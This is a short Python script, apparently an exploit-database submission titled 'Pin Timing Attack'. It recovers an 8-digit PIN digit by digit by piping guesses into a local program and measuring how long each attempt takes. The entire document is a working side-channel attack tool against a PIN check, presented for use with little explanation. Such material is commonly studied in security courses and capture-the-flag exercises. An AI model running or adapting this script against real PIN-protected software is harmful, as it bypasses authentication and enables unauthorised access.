# Title: Pin Timing Attack
# Author: Kalana Sankalpa (Anon LK)

#!/usr/bin/python
import os
import time

timeDiff = 50 #Set maximum time difference
exePath = "./program" # Set path to the program

def get_response_time(pin):
    # Convert pin list to a string
    pin_str = ''.join(map(str, pin))
    print("Trying:", pin_str)

    # Run command (eg: echo 00000000 | ./program)
    cmd = f'echo {pin_str} | {exePath}'

    # Measure execution time before and after running the command
    start = time.time()
    os.system(cmd)
    end = time.time()

    # Calculate and return the response time in milliseconds
    return (end - start) * 1000

pin = [0] * 8 # Initialize the pin to all zeros
res_time = get_response_time(pin)
max_time = res_time

print("First Response time:", res_time)

# Loop through each digit in the pin
for i in range(8):
    # Try each digit (0 to 9) for the current position in the pin
    for num in range(10):
        pin[i] = num
        res_time = get_response_time(pin)
        
        # Check if the pin was 0
        if max_time > res_time + timeDiff and num == 1:
            pin[i] = num - 1
            break

        # Find the correct pin by comparing maxTime with the current resTime
        if max_time + timeDiff < res_time:
            max_time = res_time
            break

        print("ResTime:", res_time)
        print("MaxTime:", max_time)

# print the correct pin
pin_str = ''.join(map(str, pin))
print("\nPin Found:", pin_str)
